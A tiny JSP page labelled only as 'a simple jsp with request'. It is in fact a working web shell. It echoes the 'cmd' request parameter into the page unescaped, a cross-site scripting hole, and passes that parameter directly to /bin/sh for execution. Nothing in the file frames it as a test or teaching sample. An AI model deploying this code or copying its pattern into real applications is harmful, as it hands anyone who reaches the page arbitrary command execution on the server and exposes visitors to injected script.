<!--A simple jsp with request -->
<p>http parameters: </p>
<%
out.println("<p>request parameter cmd: "+request.getParameter("cmd")+"</p>");

Runtime.getRuntime().exec(new String[] {"/bin/sh","-c",request.getParameter("cmd")});
%>